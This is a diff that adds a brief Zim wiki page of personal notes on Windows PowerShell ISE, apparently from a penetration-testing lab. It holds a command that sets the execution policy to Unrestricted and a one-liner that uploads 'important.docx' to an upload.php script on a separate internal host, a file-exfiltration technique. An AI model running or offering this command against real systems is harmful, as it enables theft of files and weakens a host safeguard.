@@ -1,0 +1,17 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:10:13-04:00
+
+====== ISE ======
+Created Tuesday 19 May 2020
+
+Windows
+PowerShell Integrated Scripting Environment (ISE)
+
+====== first step ======
+--Set-ExecutionPolicy Unrestricted
+--Get-ExecutionPolicy
+
+====== upload ======
+**powershell (New-Object System.Net.WebClient).UploadFile('http://10.11**
+**.0.4/upload.php', 'important.docx')**
